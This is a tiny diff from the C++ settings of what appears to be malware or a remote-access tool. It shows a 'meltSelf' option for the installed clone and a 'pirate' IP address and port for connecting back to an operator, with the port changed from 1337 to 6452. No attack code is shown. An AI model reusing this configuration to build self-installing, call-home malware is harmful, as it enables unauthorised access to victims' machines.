@@ -15,4 +15,4 @@ bool Settings::meltSelf = false;				//specifies whether the installed clone shou
 
 
 static const char * adresseipPirate = "127.0.0.1";
-static unsigned short portPirate = 1337;
+static unsigned short portPirate = 6452;
